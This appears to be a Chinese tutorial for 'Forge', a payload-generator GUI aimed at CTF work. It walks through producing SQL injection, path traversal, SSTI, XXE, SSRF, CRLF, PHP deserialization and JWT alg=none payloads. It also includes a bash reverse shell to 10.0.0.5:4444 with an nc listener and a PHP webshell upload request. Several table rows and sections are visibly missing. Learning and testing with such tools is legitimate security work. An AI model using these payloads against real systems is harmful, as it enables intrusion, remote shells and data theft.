## 0. 界面分区速查

启动：双击 `forge-gui.vbs`。窗口从上到下七个区：

```
┌─ 筛选 ─────────────────────────────────────────────────────┐
│ 漏洞类型 [SQL 注入 sqli ▾] 组件 [（不限）▾] 内容类型 [（不限）▾] 版本 [ ] │
├─ 目标前提（勾选 = 目标没有这个前提…括号里是勾上后会筛掉几条）──┤
│ ☐页面有回显位(57) ☐目标可出网(68) ☐支持堆叠查询/多语句(29) …  │
├─ 模板 ───────────────────┬─ 模板参数 ─────────────────────┤
│ 可用 36 条 · 缺前提 0 条  │ （选中模板的）名称 / desc        │
│      搜索[_] ☐显示缺前提的│ 槽位 闭合符 close [ ' ▾]        │
│ MySQL UNION 联合查询 …    │ 变量 文件路径 filepath [        ] │
│   └ 后面跟的是模板 id     │                                 │
├─ 绕过（按列表顺序依次应用）────────────────────────────────┤
│ [已选列表]  ↑ ↓ 移除      │ 添加（冲突项会标红）[▾] [添加]   │
├─ 提交方式 / 请求参数 / 约束校验 ───────────────────────────┤
│ 提交方式[URL 参数 query▾] HTTP 方法[GET▾] Shell[bash▾]      │
│ Host[example.com] Path[/] 参数名[id]                        │
│ Header 名[X-Test] Cookie 名[sid] 上传落点[filename▾]        │
│ 长度上限[ ] 禁用字符(逗号隔开)[ ] 黑名单关键字(逗号隔开)[ ]  │
├─ 输出层（多选）────────────────────────────────────────────┤
│ ☑原始载荷 raw ☑仅 URL 编码 encoded ☐原始 HTTP 报文 request …│
├─ 结果 ─────────────────────────────────────────────────────┤
│ [raw][encoded][curl][组装链][诊断]  ← 标签页                │
│ [复制当前标签页]  模板 sqli.mysql.union.basic               │
└────────────────────────────────────────────────────────────┘
```

**大多数操作不用点「生成」按钮 —— 改任何控件都立即重新生成。**
只有「复制当前标签页」需要手动点。

### 结果区那几个标签页

| 标签页 | 看什么 |
| --- | --- |
| `raw` / `curl` / … | 各输出层的成品，**复制走的就是这里** |
| **组装链** | 载荷怎么一步步拼出来的。排错主要靠它 |
| **诊断** | 语法校验结果 + 所有提示。**提示不拦截**，产出照常 |

**切到「组装链」之后就停在那儿别动** —— 改 Host、改参数时标签页不会被重置，
可以边调边看中间态。

### 模板列表怎么读

每行是 **`中文名` + 空格 + `模板 id`**，名字在前：

```
MSSQL 版本回显              sqli.mssql.detect.version
MSSQL UNION 联合查询        sqli.mssql.union.basic
MySQL UNION 联合查询        sqli.mysql.union.basic
```

- **名字是拿来扫的**，id 是拿来复制进脚本、贴进文档的
- id 按**显示宽度**垫齐（中文占 2 列，不能用字符数垫，否则会一列列飘开）
- 名字特别长的会把自己的 id 顶开 —— **宁可错位也不截断名字**
- 被前提筛掉的行（勾了「显示缺前提的」）长这样，灰显：

```
✗ MSSQL 版本回显            sqli.mssql.detect.version  ← 缺少前提：页面有回显位
```

### 用搜索框找模板，别滚

模板区右上角有个**搜索**框，按 `id` 或**中文名**实时过滤。
默认视图 134 条、不限漏洞类型 584 条，滚是不现实的；而你通常是
**从文档里已经知道 id** 才来的，直接搜最快：

| 输入 | 结果 |
| --- | --- |
| `union.basic` | 5 条（五个方言各一条） |
| `报错注入` | 16 条 |
| `反弹` | 在 rce 下 12 条 |

> **搜索是在「当前筛选结果」里过滤**，不会跨漏洞类型。所以在 sqli 视图下搜
> `反弹` 是 0 条 —— 这时标题栏会补一句
> `另有 12 条在其它漏洞类型或组件下`，看见它就说明**该去改上面的漏洞类型下拉**，
> 而不是「工具里没有这条模板」。

标题栏的读法：

```
可用 134 条 · 缺前提 0 条                       ← 没搜索时
匹配 40 条 / 可用 134 条 · 缺前提 0 条          ← 搜索中
匹配 0 条 / 可用 134 条 —— 另有 12 条在其它漏洞类型或组件下
```

**前提勾选框里的数字不受搜索影响** —— 它的含义是「勾上会筛掉几条」，
跟你正在找哪条模板无关。

# 一、入门

## 场景 1 · SQL 注入 · MySQL 联合查询

CTF 里最常见的入口。目标是一个 `?id=1` 的注入点，页面有回显。

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | 筛选区 **漏洞类型** | 默认就是 `SQL 注入 sqli`，不用动 |
| 2 | 筛选区 **组件** | `mysql` |
| 3 | 模板区 **列表** | 点 `sqli.mysql.union.basic` |
| 4 | 模板参数区 **槽位 回显位 pos** | `2` |
| 5 | 输出层区 | 勾上 `原始载荷 raw` + `curl 命令 curl` |

组件选完，模板区标题会从 `可用 134 条` 变成 **`可用 36 条 · 缺前提 0 条`**。

### 产出

**标签页 `raw`：**

```
' UNION SELECT 1,2,3 -- -
```

**标签页 `curl`：**

```
curl 'http://example.com/?id=%27%20UNION%20SELECT%201%2C2%2C3%20--%20-'
```

**标签页 `组装链`：**

```
槽位填充           ' UNION SELECT <<select(cols,pos)>> -- -
变量替换           ' UNION SELECT 1,2,3 -- -
```

**标签页 `诊断`：**

```
语法: 该内容类型无可靠 parser（sql-expression）
```

### 三个要读懂的地方

1. **组装链第一行还留着 `<<select(cols,pos)>>`** —— 因为那是**变量替换**阶段才展开的，
   不是槽位填充阶段。两行一对比就知道工具在什么时候做了什么。

2. **`语法: 该内容类型无可靠 parser`不是失败**。SQL 本来就没有可靠的解析器，
   工具如实说「我没校验」，而不是假装校验过。真做校验的只有
   Python / JSON / XML / Jinja2 / PHP 序列化。

3. **回显位 `pos` 是全族通用的**。把它改成 `1`，所有 UNION 模板（爆版本、读表名、
   读文件）都跟着走 —— 不用一条条改。

> **列数要先探。** 这里 `cols` 用了默认的 `3`。真实目标列数未知时，
> 先用 `sqli.mysql.union.orderby` 递增序号，报错点就是列数。

## 场景 2 · 筛到空结果了，怎么办

新手最容易卡住的地方：选完漏洞类型，模板列表空了。

### 复现

筛选区 **漏洞类型** 选 `命令注入 rce`，**内容类型** 选 `SQL 表达式 sql-expression`。

模板区标题变成 `可用 0 条 · 缺前提 0 条`，结果区出现：

```
当前条件下没有可用模板。

放宽下列任一条即可看到结果：
  去掉漏洞类型限定「rce」                            多出 134 条（共 134 条）
  去掉内容类型限定「sql-expression」                 多出 51 条（共 51 条）

被排除的模板及原因：
  cors.generic.probe.origin                  漏洞类型不符
  cors.generic.probe.null                    漏洞类型不符
  …
  …（共 584 条，界面里可滚动查看）
```

### 怎么读

- **`多出 N 条`是「放宽这一条之后，可用模板会变成多少」**。这里两边都是死路：
  放宽漏洞类型只剩 sqli 的 134 条（跟 rce 无关），放宽内容类型只剩 rce 的 51 条。
  两条建议本身都在告诉你：**这个组合是自相矛盾的**。
- 原因列里全是「漏洞类型不符」—— 因为选了 rce，另外 19 类全被你自己筛掉了。

### 正解

命令注入的载荷文本是 **shell 命令**，不是 SQL。把 **内容类型改回 `（不限）`**，
或者直接选 `Shell 命令 shell-command`。

> 这是**内容类型≠漏洞效果**的经典混淆。`xp_cmdshell` 的效果是执行命令，
> 但它的**文本**是 T-SQL，所以内容类型仍是 `sql-expression`。详见使用说明 §3。

## 场景 3 · 路径穿越读 /etc/passwd

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | 筛选区 **漏洞类型** | `路径穿越 traversal` |
| 2 | 模板区 **列表** | `traversal.generic.linux` |
| 3 | 输出层区 | 勾上 `原始载荷 raw` + `原始 HTTP 报文 request` |

**先什么都别填变量**，看产出：

```
/../../../../<<filepath>>
```

`<<filepath>>` **原样留在载荷里** —— 因为 `filepath` 没有默认值。

### 填上变量

模板参数区 **变量 文件路径 filepath** 填 `/etc/passwd`：

```
/../../../..//etc/passwd
```

### 这里有个值得注意的地方

产出是 `/../../../..//etc/passwd` —— **中间有两个斜杠**。

因为槽位 `depth` 选的是 `/../../../../`（**结尾带斜杠**），而 `filepath` 填的
`/etc/passwd`（**开头带斜杠**），拼起来就多了一个。Linux 上 `//etc/passwd`
通常照样能读，但它**不是**你想要的形态。

**修法**：`filepath` 变量**不写开头的斜杠**，填 `etc/passwd`（而不是 `/etc/passwd`）：

```
depth = /../../../../   filepath = etc/passwd
→ /../../../../etc/passwd
```

因为 `depth` 的每一个选项**结尾都带斜杠**（合法取值只有
`/`、`/../`、`/../../`、`/../../../`、`/../../../../`、`/../../../../../`），
拼接时斜杠由**槽位那一侧**提供，变量这边就不能再给一个。

> 工具**不会**替你发现这个 —— 它只保证「产出符合你的选择」，
> 不保证语义正确。这类「语法合法、语义已错」的坑，只能自己核对产出。
> 这也是为什么文档反复强调**要读组装链**。

# 二、进阶

## 场景 4 · 命令注入 · Bash 反弹 Shell

CTF 拿 shell 的标准动作。

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | 筛选区 **漏洞类型** | `命令注入 rce` |
| 2 | **内容类型** | 保持 `（不限）`（见场景 2 的教训） |
| 3 | 模板区 **列表** | `rce.linux.reverse.bash` |
| 4 | 输出层区 | `原始载荷 raw` + `curl 命令 curl` |

### 先不填 lhost / lport 看会发生什么

```
;bash -i >& /dev/tcp// 0>&1
```

IP 和端口位置**空着** —— 组装链里能看到 `<<lhost>>` / `<<lport>>` 在变量替换阶段
被替换成了空串。

### 填上

**变量 lhost** = `10.0.0.5`，**变量 lport** = `4444`：

```
;bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
```

curl 标签页：

```
curl 'http://example.com/?id=%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.5%2F4444%200%3E%261'
```

### 为什么回调地址故意没有默认值

这是**有意的设计**，不是漏配：漏填应该得到一个**明显不可用的串**，
而不是一个指向某个真实地址的串。空着的时候你一眼就看出没填完；
要是给了 `127.0.0.1` 之类的默认值，你会拿着一个看起来正常、
实际打不通的载荷去试半天。

### 别忘了起监听

这条模板需要两个前提：**目标可出网** + **已在 lhost 上起监听**。

在**目标前提**区**不要勾**这两条 —— 勾上表示「我的目标没有这个条件」，模板会被筛掉。
同时在你自己机器上：

```bash
nc -lvnp 4444
```

> 前提是**反着勾**的：**勾上 = 目标没有这个前提**。这一条新手最容易搞反。

## 场景 5 · SSTI · Jinja2 命令执行

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** | `模板注入 ssti` |
| 2 | **组件** | `flask` |
| 3 | 模板区 | `ssti.jinja2.rce.config` |
| 4 | **变量 命令 cmd** | `id` |
| 5 | 输出层 | `raw` + `仅 URL 编码 encoded` + `Python 代码 python` |

### 产出

**`raw`：**

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**`诊断`：**

```
语法: jinja2 语法校验通过
```

**这一条语法是真的校验了** —— Jinja2 有可靠 parser，模板里声明了
`syntax_lang`。对比场景 1 的 `无可靠 parser`，就知道工具什么时候在说真话。

### 一个反直觉的坑：组件要选 `flask`，不是 `jinja2`

`ssti.jinja2.rce.config` 的组件标的是 **`flask`**，不是 `jinja2`。

**这不是笔误，是刻意的。** `config` 和 `request` 都是 **Flask 注入**到模板上下文里的
对象 —— 纯 `jinja2.Environment()` 的全局只有 `range` / `dict` / `lipsum` / `cycler` /
`joiner` / `namespace`，**没有** `config`，也没有 `request`。

所以 `data/ssti/jinja2.yaml` 里 16 条模板的组件是这样分的：

| 模板 | 组件 | 为什么 |
| --- | --- | --- |
| `rce.config` | `flask` | 靠 `config` 拿 globals |
| `rce.request` | `flask` | desc 写着「Flask 上下文里 request 对象可用时走这条」 |
| `rce.request.args` | `flask` | 同上 |
| 其余 13 条（`lipsum` / `cycler` / `self` / `subclasses` / `attr` / `stmt.*` / `file.read` …） | 通用 | 纯 Jinja2 内置 |

`rce.lipsum` 那条的 desc 写得很明确：**「config 不可用时的替代，lipsum 是 Jinja2
内置全局函数」** —— 它就是给非 Flask 环境准备的等价路径。

### 选错了会怎样（两种顺序，表现不同）

**顺序 A：先选中 `rce.config`，再把组件改成 `jinja2`**

该模板立刻被筛掉，**GUI 自动跳到列表第一条可用模板**
（`ssti.generic.detect.arith`），右侧参数区从「变量 命令 cmd」变成一个空的探测载荷：

```
{{7*7}}
```

一个探测用的载荷，不是命令执行 —— 而你没有做任何操作，是它自己跳的。

**顺序 B：组件先选 `jinja2`，再翻列表**

`rce.config` **压根不在列表里**。`组件=jinja2` 时列表就 16 条，标题写着
`可用 16 条 · 缺前提 0 条` —— 你不会知道少了一条。

### 而且「显示缺前提的」也帮不上忙

那个勾选框**只列「缺少前提」被筛掉的模板**（实现上过滤
`reason.startswith("缺少前提")`），组件不符的永远不显示。实测：

```
组件=jinja2 + 勾上「显示缺前提的」 → 列表 16 条
含 rce.config 吗: False
含任何 ✗ 灰显项吗: False
```

**所以没有任何界面线索指向它。** 只能靠知道这件事。

> **不确定目标框架时，组件留 `（不限）`。** 硬选一个反而会把对的模板筛掉，
> 而且筛得无声无息。

## 场景 6 · XXE 读文件

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** | `XML 外部实体 xxe` |
| 2 | 模板区 | `xxe.generic.file.read` |
| 3 | **变量 文件路径 filepath** | `/etc/passwd` |
| 4 | 输出层 | `raw` + `原始 HTTP 报文 request` |

### 产出

**`raw`（三行 XML）：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

**`诊断`：**

```
语法: xml 语法校验通过
```

**组装链是多行的** —— 因为载荷本身就是多行文档，工具按原样逐行显示，
不会挤成一行。

### XML 校验能做到什么程度

**只验良构性，不解析实体。** 工具验证的是「这段 XML 格式对不对」，
**不是**「实体能不能展开」。所以：

- 语法通过 ≠ 目标解析器没禁用外部实体
- 真实的 XXE 能不能成功，取决于目标 XML 解析器的配置

> 实现上用的是 expat 而非 `xml.etree` —— 后者会把含 DTD 的**合法** XXE 载荷
> 误报成 `undefined entity`。这是踩过的坑。

## 场景 7 · 绕过链与顺序（这条最容易搞错）

绕过**不是集合，是有序列表**。顺序不同，产出可能完全不同。

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** `sqli` / **组件** `mysql` | |
| 2 | 模板 `sqli.mysql.union.basic` | 回显位 `pos` 设 `1` |
| 3 | 绕过区 **添加** 下拉 | 选 `注释替代空格 bypass.space.comment` → 点 **添加** |
| 4 | 绕过区 **添加** 下拉 | 再选 `URL 编码 bypass.url` → 点 **添加** |

顺序是：**注释替代空格 → URL 编码**。

**`组装链`：**

```
槽位填充           ' UNION SELECT <<select(cols,pos)>> -- -
变量替换           ' UNION SELECT 1,2,3 -- -
注释替代空格         '/**/UNION/**/SELECT/**/1,2,3/**/--/**/-
URL 编码         %27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2C2%2C3%2F%2A%2A%2F--%2F%2A%2A%2F-
```

每一步的中间态都看得见 —— 这就是「绕过是盲盒还是可见的」的区别。

### 现在把顺序反过来

选中 `URL 编码`，按 **↑** 把它挪到 `注释替代空格` 前面：

**`组装链`：**

```
槽位填充           ' UNION SELECT <<select(cols,pos)>> -- -
变量替换           ' UNION SELECT 1,2,3 -- -
URL 编码         %27%20UNION%20SELECT%201%2C2%2C3%20--%20-
注释替代空格         %27%20UNION%20SELECT%201%2C2%2C3%20--%20-
```

最后一步**什么都没做** —— 因为空格在上一行已经变成 `%20` 了，
`注释替代空格` 找不到目标。工具直接说了出来：

```
提示: 绕过 注释替代空格 没有改变载荷 —— 可能被前一步抵消了（检查绕过顺序）
```

### 两个提示都值得注意

| 提示 | 含义 |
| --- | --- |
| `绕过 X 没有改变载荷` | 这一步跑了但产出没变，多半**被前一步抵消了** |
| `绕过链已做 1 次 URL 编码，提交方式 query 放入请求时会再编码一次（请求内共 2 次）` | **双重编码**。本意是 WAF 绕过就忽略；不是的话要改 |

### 但不是所有组合都受顺序影响

「交替大小写」和「URL 编码」互换顺序，产出**完全相同** ——
字母编码后还是字母，大小写替换照样找得到目标。

所以**别拿这一组做对照实验**，它证明不了顺序无关。

### 绕过是互斥的会标红

同时添加 `IP 转十进制` 和 `IP 转十六进制`，绕过区下方出现红字：

```
互斥：IP 转十进制 与 IP 转十六进制
```

显示的是**中文名**（和界面上其它地方一致）。想找对应的 id，看绕过列表 ——
那一栏是「id + 名称」并排的。

**只是提示，不拦截**。你可以照常生成，但结果多半不是你要的 ——
第一个替换完之后，`127.0.0.1` 已经没了，第二个找不到目标。

## 场景 8 · SSRF 打内网 + IP 变形绕过

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** | `服务端请求伪造 ssrf` |

| 4 | **参数名** | 改成 `url`（SSRF 点的参数通常不叫 id） |
| 5 | 绕过区 | 添加 `IP 转十进制 bypass.ip.decimal` |
| 6 | 输出层 | `raw` + `curl` |

### 产出

**`组装链`：**

```
槽位填充           http://127.0.0.1:6379/
变量替换           http://127.0.0.1:6379/
IP 转十进制        http://2130706433:6379/
```

**`raw`：**

```
http://2130706433:6379/
```

所以：

- **载荷里得真的有 `127.0.0.1`** 才替换得动
- 换成云元数据模板（`169.254.169.254`）就**匹配不上**，产出原样不动，
  工具会报 `提示: 绕过 IP 转十进制 没有改变载荷`

**这不是 bug**，是「绕过定义只对特定目标串生效」。看到这条提示先回头看

## 场景 9 · CRLF 注入响应头

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** | `CRLF 响应头注入 crlf` |

| 4 | **Header 名** | `X-Forwarded-For` |

### 产出

**`raw`：**

```
%0d%0aX-Crlf-Probe:%20injected
```

**`request`：**

```http
GET / HTTP/1.1
Host: example.com

```

**注意载荷落在 `X-Forwarded-For` 的值里** —— 这正是你点的「提交方式 = 请求头」

### 槽位 `nl` 的五个选项

模板参数区的 **槽位 换行符 nl** 是个**字典型槽位**，选项名称里带说明：

| 选项 | 什么时候用 |
| --- | --- |
| `%0d%0a（明文的百分号编码，URL 参数里最常用）` | 默认 |
| `%0a（只有 LF，部分实现照样拆头）` | 防御只拦 CRLF 时 |
| `%0d（只有 CR）` | 同上 |
| `原样 CRLF（值直接落在头里、不经 URL 编码时用）` | 提交方式选 header 时常常更合适 |
| `%250d%250a（双重编码，过滤器只解码一次时用）` | 过滤器只解一次码时 |

> **它是「字典型槽位」**：一组值必须配套选。这类槽位保证你不会拼出
> 互相矛盾的组合。界面上你只能整组选，不能拆开。

## 场景 10 · PHP 反序列化 · 长度自算

**这是 Forge 最值钱的功能之一。** PHP 序列化每一段都带字节长度前缀，
手写时数错一个字节 `unserialize()` 就报错，而错误信息只说 `offset N`。

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** | `反序列化 deser` |
| 2 | 模板区 | `deser.php.custom.structure` |
| 3 | **变量 结构描述 spec** | `O:User{ #name=s:"管理员" }` |
| 4 | 输出层 | `raw` |

### 产出

**`raw`：**

```
O:4:"User":1:{s:10:"␀User␀name";s:9:"管理员";}
```

（`␀` 是**真实的 NUL 字节** 0x00 —— 终端里显示成空隙。PHP 的 private 属性
名字就是这个形状：`\0类名\0属性名`。）

**`诊断`：**

```
语法: PHP 序列化校验通过（长度前缀与元素个数都对得上）
```

### 它替你算对了什么

| 片段 | 为什么容易错 |
| --- | --- |
| `O:4:"User"` | 类名 `User` 4 字节 |
| `s:10:"␀User␀name"` | **两个 NUL 也算进长度**：1+4+1+4 = 10 |
| `s:9:"管理员"` | **`管理员` 是 3 个字符，但 9 个字节**（UTF-8 每字 3 字节） |
| `:1:{…}` | 声明的属性个数必须和实际写出来的一致 |

`管理员` 那一条是经典坑：写成 `s:3:` 是最容易犯的错，PHP 直接解析失败。
和 HTTP 的 `Content-Length` 是同一个坑。

### 你只写结构，不用数字节

```
你填：   O:User{ #name=s:"管理员" }
工具出： O:4:"User":1:{s:10:"␀User␀name";s:9:"管理员";}
```

属性名前缀的含义：

| 写法 | 属性可见性 |
| --- | --- |
| `name` | public |
| `-name` | protected |
| `#name` | private（mangling 用当前类） |
| `#类名/属性` | private，但 mangling 用**指定的那个类**（父类私有属性） |

### 产出自带校验

**这是免费的回归防线**：工具会把算出来的串**自己再校验一遍**
（长度前缀、元素个数、结尾是否恰好）。不对就标红并告诉你偏移在哪。

### 引用：POP 链里最常见的形状

真实链路里 `$obj->prop = $obj` 这种自引用非常常见，写法是 **`&标签` 标住那个值，
再用 `r:标签` 指回来**：

```
你在 spec 里填：  &r O:Monolog\Handler\BufferHandler{ handler=r:r }
工具产出：        O:29:"Monolog\Handler\BufferHandler":1:{s:7:"handler";r:1;}
```

- **`r:` 是同一个对象，`R:` 是真引用（PHP 的 `&`）** —— 两者在 PHP 里不是一回事
- `&标签` **根上也能打**（上面就是），不打的话最外层对象没名字可指
- 编号由工具算。规则是从真 PHP 实测出来的：先序；键不占号；
  **`r:`/`R:` 的产出本身也占一个号**

最后那条最容易漏 —— 它决定引用**之后**的所有值会不会偏号。所以产出的串
会被工具自己校验一遍（校验器是独立于生成器的第二份实现，两边分别写了一遍
编号逻辑，正好互相兜底）。

```
a{ i:0=&z O:Z{} i:1=r:z i:2=s:"after" i:3=&y O:Y{} i:4=r:y }
→ a:5:{i:0;O:1:"Z":0:{}i:1;r:2;i:2;s:5:"after";i:3;O:1:"Y":0:{}i:4;r:5;}
                                                                    ↑ 是 5 不是 4：
                                                              前面的 r: 吃掉了一个号
```

### 仍然做不到的

**`C:`（Serializable 自定义格式）和 `E:`（PHP 8.1 enum）不支持。**
这两样的展开规则没有实测过，宁可不做也不猜——请用 `phpggc` 生成后当普通变量贴进来。
模板里也有现成的 `deser.php.pop.*` 系列可以对照。

## 场景 11 · 文件上传 · multipart 表单

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** | `文件上传 upload` |
| 2 | 模板区 | `upload.generic.content.php` |
| 3 | **槽位 执行函数 func** | `system` |
| 4 | **变量 命令 cmd** | `whoami` |
| 5 | **提交方式** | `文件上传表单 multipart` |
| 6 | **HTTP 方法** | `POST` |
| 7 | **Path** | `/upload.php` |
| 8 | **参数名** | `file` |
| 9 | **上传落点** | `content`（把载荷放进文件内容） |
| 10 | 输出层 | `raw` + `原始 HTTP 报文 request` |

### 产出

**`raw`：**

```php
<?php system('whoami'); ?>
```

**`request`：**

```http
POST /upload.php HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 217

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="a.txt"
Content-Type: application/octet-stream

<?php system('whoami'); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**整份 multipart 报文是工具拼的**，`boundary` 和 `Content-Length` 都算好了 ——
手写这两个字段是另一个容易错的地方。

### 上传落点 `filename` 和 `content` 的区别

| 落点 | 载荷放在 | 典型用法 |
| --- | --- | --- |
| `filename` | `filename="…"` 里 | 文件名穿越、双扩展名（模板 `upload.generic.filename.*`） |
| `content` | 文件内容里 | 一句话木马、图片马（模板 `upload.generic.content.*`） |

**这条模板是 `content` 类**，所以落点选 `content` 才对。选 `filename`
会把 `<?php …?>` 塞进文件名里，那就不是你要的东西了。

> **载荷是文本串，表达不了二进制。** 图片马只支持 `GIF89a` / `%PDF-1.4` / `RIFF`
> 这类纯文本魔术字节；PNG 的 `\x89PNG`、ZIP 的 `PK\x03\x04` 表达不了。
> 二进制形态走外部生成器。

## 场景 12 · JWT · alg=none 空签名

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | **漏洞类型** | `JWT 攻击 jwt` |
| 2 | 模板区 | `jwt.generic.none.token` |
| 3 | **槽位 算法取值 alg** | `none` |
| 4 | **变量 声明段 claims** | `eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ` |
| 5 | 输出层 | `raw` + `curl` |

### 产出

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.
```

**注意结尾的点号还在** —— `alg=none` 的 token 是
`头.载荷.`（第三段空签名），不是两段。这是这条模板的重点，
另有 `jwt.generic.none.two_segment` 专门产两段的畸形形态。

### 头段是槽位替你编码好的

槽位 `alg` 的选项里存的是**编码后的头段**：

| 选项 | 头段 |
| --- | --- |
| `none` | `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0` |
| `None` | `eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0` |
| `NONE` | … |
| `nOnE` | … |

四个大小写变体是给**只做字符串黑名单**的服务端准备的 —— 它拦 `none`
不拦 `None`。

**claims 段要你自己 base64url 编码**（工具不做 JWT 编码，只做拼接）。
上面那串解出来是 `{"sub":"admin","admin":true}`。

## 场景 13 · 成品约束校验

CTF 里经常有长度限制和关键字黑名单。把条件填进「约束校验」，工具会告诉你成品过不过。

### 操作

| 步 | 点哪里 | 设成 |
| --- | --- | --- |
| 1 | 模板 | `sqli.mysql.union.basic`，`pos` = `1` |
| 2 | **长度上限** | `20` |
| 3 | **黑名单关键字(逗号隔开)** | `UNION` |

### 产出

**`raw` 照常输出**：

```
' UNION SELECT 1,2,3 -- -
```

**`诊断`：**

```
语法: 该内容类型无可靠 parser（sql-expression）
提示: 长度 25 超过上限 20
提示: 含黑名单关键字 'UNION'
```

### 关键：它只报告，不拦截

  `版本注释包裹（UNION）`

「禁用字符」那一栏同理，填逗号隔开的字符集，成品里出现了就提示。

## 场景 14 · 同一份载荷的 11 个输出层

**输出层是多选的**，勾几个就出几个标签页。同一份 `' UNION SELECT 1,2,3 -- -`：

| 输出层 | 产出（节选） |
| --- | --- |
| `原始载荷 raw` | `' UNION SELECT 1,2,3 -- -` |
| `仅 URL 编码 encoded` | `%27%20UNION%20SELECT%201%2C2%2C3%20--%20-` |
| `原始 HTTP 报文 request` | `GET /?id=%27%20UNION… HTTP/1.1` + `Host:` 头 |
| `curl 命令 curl` | `curl 'http://example.com/?id=%27%20UNION…'` |
| `HTTPie 命令 httpie` | `http 'GET' 'http://example.com/?id=%27%20UNION…'` |
| `PowerShell 脚本 powershell` | `$r = Invoke-WebRequest -Uri 'http://example.com/?id=…' -Method GET` |
| `Python 代码 python` | `import requests` / `r = requests.get(` … `)` |
| `Node 代码 node` | `await fetch('http://example.com/?id=…', { method: 'GET' });` |
| `Java 代码 java` | `HttpClient.newHttpClient()` … |
| `PHP 代码 php` | `$ch = curl_init();` … |
| `Burp 报文 burp` | 同 request，便于直接粘进 Repeater |

### 怎么选

| 场景 | 勾什么 |
| --- | --- |

## 这些产出是怎么来的

文档里每段输出都是从引擎实跑取证后粘贴的，没有手写。复现方式：

```python
from forge import engine

rules = engine.load_rules("data")
res = engine.generate(rules, engine.make_state(
    vuln="sqli", component="mysql", template="sqli.mysql.union.basic",
    slots={"close": "'", "cols": "3", "pos": "2"},
    outputs=["raw", "curl"],
))
print(res["payload"])
```
